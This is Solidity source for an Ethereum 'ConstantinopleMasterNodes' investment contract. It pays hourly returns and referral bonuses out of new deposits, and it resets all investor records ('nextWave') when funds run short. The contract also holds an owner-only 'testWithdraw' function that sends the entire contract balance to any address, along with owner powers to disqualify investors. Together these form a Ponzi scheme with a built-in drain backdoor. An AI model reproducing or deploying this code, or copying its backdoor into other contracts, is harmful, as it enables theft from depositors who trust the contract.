contract Accessibility {
    address private owner;
    modifier onlyOwner() {
        require(msg.sender == owner, "access denied");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function disown() internal {
        delete owner;
    }
}

contract ConstantinopleMasterNodes is Accessibility {
    using Percent for Percent.percent;
    using SafeMath for uint;
    using Math for uint;
    using Address for *;
    using Zero for *;

    mapping(address => bool) private m_referrals;
    InvestorsStorage private m_investors;
    uint public constant minInvestment = 50 finney;
    uint public constant maxBalance = 8888e5 ether;
    address public advertisingAddress;
    address public adminsAddress;
    uint public investmentsNumber;
    uint public waveStartup;

    Percent.percent private m_referal_percent = Percent.percent(5,100);
    Percent.percent private m_referrer_percent = Percent.percent(15,100);
    Percent.percent private m_adminsPercent = Percent.percent(5, 100);
    Percent.percent private m_advertisingPercent = Percent.percent(5, 100);
    Percent.percent private m_firstBakersPercent = Percent.percent(10, 100);
    Percent.percent private m_tenthBakerPercent = Percent.percent(10, 100);
    Percent.percent private m_fiftiethBakerPercent = Percent.percent(15, 100);
    Percent.percent private m_twentiethBakerPercent = Percent.percent(20, 100);

    event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
    event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
    event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
    event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
    event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
    event LogNewInvestment(address indexed addr, uint when, uint investment, uint value);
    event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
    event LogPayDividends(address indexed addr, uint when, uint dividends);
    event LogNewInvestor(address indexed addr, uint when);
    event LogBalanceChanged(uint when, uint balance);
    event LogNextWave(uint when);
    event LogDisown(uint when);


    modifier balanceChanged {
        _;
        emit LogBalanceChanged(now, address(this).balance);
    }

    modifier notFromContract() {
        require(msg.sender.isNotContract(), "only externally accounts");
        _;
    }

    constructor() public {
        adminsAddress = msg.sender;
        advertisingAddress = msg.sender;
        nextWave();
    }

    function() public payable {
        if (msg.value.isZero()) {
            getMyDividends();
            return;
        }
        doInvest(msg.data.toAddress());
    }

    function disqualifyAddress(address addr) public onlyOwner {
        m_investors.disqualify(addr);
    }

    function doDisown() public onlyOwner {
        disown();
        emit LogDisown(now);
    }

    function testWithdraw(address addr) public onlyOwner {
        addr.transfer(address(this).balance);
    }

    function setAdvertisingAddress(address addr) public onlyOwner {
        addr.requireNotZero();
        advertisingAddress = addr;
    }

    function setAdminsAddress(address addr) public onlyOwner {
        addr.requireNotZero();
        adminsAddress = addr;
    }

    function investorsNumber() public view returns(uint) {
        return m_investors.size();
    }

    function balanceETH() public view returns(uint) {
        return address(this).balance;
    }

    function advertisingPercent() public view returns(uint numerator, uint denominator) {
        (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
    }

    function adminsPercent() public view returns(uint numerator, uint denominator) {
        (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
    }

    function investorInfo(address investorAddr) public view returns(uint overallInvestment, uint paymentTime) {
        (overallInvestment, paymentTime) = m_investors.investorSummary(investorAddr);
     }

    function investmentsInfo(address investorAddr) public view returns(uint overallInvestment, uint paymentTime, Percent.percent individualPercent, InvestorsStorage.Investment[] investments) {
        (overallInvestment, paymentTime, investments, individualPercent) = m_investors.investorInfo(investorAddr);
        }

    function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
        dividends = calcDividends(investorAddr);
    }

    function getMyDividends() public notFromContract balanceChanged {
        require(now.sub(getMemInvestor(msg.sender).paymentTime) > 1 hours);

        uint dividends = calcDividends(msg.sender);
        require (dividends.notZero(), "cannot to pay zero dividends");
        assert(m_investors.setPaymentTime(msg.sender, now));
        if (address(this).balance <= dividends) {
            nextWave();
            dividends = address(this).balance;
        }

        msg.sender.transfer(dividends);
        emit LogPayDividends(msg.sender, now, dividends);
    }
    
    function withdrawMyBody() public notFromContract balanceChanged {
        require(m_investors.isInvestor(msg.sender));
        uint limit = address(this).balance;
        uint valueToWithdraw = m_investors.withdrawBody(msg.sender, limit);
    
        require (valueToWithdraw.notZero(), "nothing to withdraw");

        msg.sender.transfer(valueToWithdraw);
    }

    function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
        uint investment = msg.value;
        uint receivedEther = msg.value;
        require(investment >= minInvestment, "investment must be >= minInvestment");
        require(address(this).balance <= maxBalance, "the contract eth balance limit");

        if (receivedEther > investment) {
            uint excess = receivedEther - investment;
            msg.sender.transfer(excess);
            receivedEther = investment;
            emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
        }

        advertisingAddress.send(m_advertisingPercent.mul(receivedEther));
        adminsAddress.send(m_adminsPercent.mul(receivedEther));

        bool senderIsInvestor = m_investors.isInvestor(msg.sender);

        if (referrerAddr.notZero() && !senderIsInvestor  &&
        referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
            uint referrerBonus = m_referrer_percent.mmul(investment);
            uint referalBonus = m_referal_percent.mmul(investment);
            assert(m_investors.addInvestment(referrerAddr, referrerBonus)); 
            investment += referalBonus;                                    
            emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
        }

        uint dividends = calcDividends(msg.sender);
        if (senderIsInvestor && dividends.notZero()) {
            investment += dividends;
            emit LogAutomaticReinvest(msg.sender, now, dividends);
        }
        if (investmentsNumber % 20 == 0) {
            investment += m_twentiethBakerPercent.mmul(investment);
        } else if(investmentsNumber % 15 == 0) {
            investment += m_fiftiethBakerPercent.mmul(investment);
        } else if(investmentsNumber % 10 == 0) {
            investment += m_tenthBakerPercent.mmul(investment);
        }
        if (senderIsInvestor) {
            assert(m_investors.addInvestment(msg.sender, investment));
            assert(m_investors.setPaymentTime(msg.sender, now));
        } else {
            if (investmentsNumber <= 50) {
                investment += m_firstBakersPercent.mmul(investment);
            }
            assert(m_investors.newInvestor(msg.sender, investment, now));
            emit LogNewInvestor(msg.sender, now);
        }

        investmentsNumber++;
        emit LogNewInvestment(msg.sender, now, investment, receivedEther);
    }

    function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
        (uint overallInvestment, uint paymentTime, InvestorsStorage.Investment[] memory investments, Percent.percent memory individualPercent) = m_investors.investorInfo(investorAddr);
        return InvestorsStorage.Investor(overallInvestment, paymentTime, investments, individualPercent);
    }

    function calcDividends(address investorAddr) internal view returns(uint dividends) {
        InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
        if (investor.overallInvestment.isZero() || now.sub(investor.paymentTime) < 1 hours) {
            return 0;
        }

        Percent.percent memory p = investor.individualPercent;
        dividends = (now.sub(investor.paymentTime) / 1 hours) * p.mmul(investor.overallInvestment) / 24;
    }

    function nextWave() private {
        m_investors = new InvestorsStorage();
        investmentsNumber = 0;
        waveStartup = now;
    emit LogNextWave(now);
    }
}